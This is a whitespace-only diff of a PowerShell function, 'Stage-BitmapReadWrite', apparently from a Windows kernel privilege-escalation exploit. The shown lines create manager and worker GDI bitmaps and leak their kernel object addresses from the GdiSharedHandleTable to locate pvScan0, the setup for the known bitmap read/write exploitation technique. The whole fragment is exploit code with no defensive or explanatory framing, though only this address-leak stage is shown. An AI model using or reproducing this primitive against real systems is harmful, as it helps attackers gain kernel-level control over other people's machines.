@@ -120,12 +120,12 @@ function Stage-BitmapReadWrite {
 	$ManagerBitmap = [Gdi32]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
 	if ($x32Architecture) {
 		$ManagerHandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
-	    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)
-	    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)) + 0x30
+		$ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)
+		$ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)) + 0x30
 	} else {
 		$ManagerHandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
-	    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)
-	    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)) + 0x50
+		$ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)
+		$ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)) + 0x50
 	}
 
 	# Worker Bitmap
@@ -133,12 +133,12 @@ function Stage-BitmapReadWrite {
 	$WorkerBitmap = [Gdi32]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
 	if ($x32Architecture) {
 		$WorkerHandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
-	    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)
-	    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)) + 0x30
+		$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)
+		$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)) + 0x30
 	} else {
 		$WorkerHandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
-	    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)
-	    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)) + 0x50
+		$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)
+		$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)) + 0x50
 	}
 
 	$BitMapObject = @()
